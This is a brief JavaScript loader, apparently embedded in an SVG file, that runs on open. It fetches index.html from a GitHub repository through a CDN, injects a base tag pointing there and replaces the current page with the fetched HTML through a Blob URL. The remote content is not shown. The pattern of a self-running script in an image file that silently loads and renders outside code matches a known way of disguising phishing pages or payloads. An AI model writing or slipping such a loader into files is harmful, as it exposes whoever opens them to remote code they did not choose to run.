svg.script:
(function () {
  var BASE = 'https://cdn.jsdelivr.net/gh/Mike1000571/MKUBG4@main/';
  fetch(BASE + 'index.html')
    .then(function (r) { return r.text(); })
    .then(function (html) {
      html = html.replace(/<head>/i, '<head><base href="' + BASE + '">');
      var blob = new Blob([html], { type: 'text/html' });
      location.replace(URL.createObjectURL(blob));
    })
    .catch(function (e) { console.error('Could not load index.html', e); });
})();
